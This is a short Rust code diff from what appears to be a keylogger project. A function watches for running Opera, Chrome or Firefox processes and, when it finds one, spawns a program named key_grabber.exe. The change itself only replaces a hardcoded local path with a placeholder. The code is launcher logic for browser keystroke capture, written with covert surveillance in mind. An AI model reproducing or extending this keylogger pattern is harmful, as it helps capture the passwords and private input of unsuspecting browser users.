@@ -24,17 +24,17 @@ fn gets_process(pid: &str)
         let is_up = _proc.name();
         if is_up == "opera.exe"
         {
-            let _start_p = Command::new("c:/Users/damar/.cargo/roggler/target/debug/key_grabber.exe")
+            let _start_p = Command::new("PATH to key_grabber.exe")
                 .spawn()
                 .expect("NONE");
             
         }else if is_up == "chrome.exe"{
-            let _start_p = Command::new("c:/Users/damar/.cargo/roggler/target/debug/key_grabber.exe")
+            let _start_p = Command::new("PATH to key_grabber.exe")
                 .spawn()
                 .expect("NONE");
 
         }else if is_up == "firefox.exe" {
-            let _start_p = Command::new("c:/Users/damar/.cargo/roggler/target/debug/key_grabber.exe")
+            let _start_p = Command::new("PATH to key_grabber.exe")
                 .spawn()
                 .expect("NONE");
         
